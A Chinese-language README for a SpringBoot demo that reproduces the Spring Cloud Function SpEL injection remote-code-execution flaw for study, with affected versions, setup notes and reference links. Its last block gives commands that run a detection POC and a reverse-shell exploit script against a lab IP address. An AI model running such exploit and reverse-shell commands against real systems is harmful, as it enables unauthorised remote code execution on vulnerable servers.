# 关于项目

一个简单的SpringBoot Demo用于复现学习 [Spring Cloud Function SPEL表达式注入漏洞](https://www.anquanke.com/post/id/271221)

### 漏洞名称

Spring Cloud Function SPEL表达式注入漏洞

### 漏洞描述

Spring框架为现代基于java的企业应用程序(在任何类型的部署平台上)提供了一个全面的编程和配置模型。

Spring Cloud 中的 serveless框架 Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成Spel表达式注入，攻击者可通过该漏洞执行任意代码。

### 利用条件
3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

### 环境搭建
在官方网页新建一个 Spring boot 项目(https://start.spring.io/)、使用idea启动。

### 修改 pom.xml 配置文件

编译项目成功后，启动 http://127.0.0.1:8080，出现 Whitelabel Error Page 页面表示成功。

## 问题解决
- [java: 错误: 无效的源发行版：15](https://blog.csdn.net/qq_42025798/article/details/113917231)

## REF
- [Spring Cloud Function SPEL表达式注入漏洞](https://www.anquanke.com/post/id/271221)
- [SpringCloud Function SpEL漏洞环境搭建+漏洞复现](https://www.anquanke.com/post/id/271167)
- [Spring-cloud-function-SpEL-RCE](https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE)

```
开始检测漏洞并反弹shell
## 检测漏洞
python3 Spel_RCE_POC.py url.txt
## 反弹shell
python3 Spel_RCE_Bash_EXP.py http://192.168.160.146:9000/ 192.168.160.241 7777
```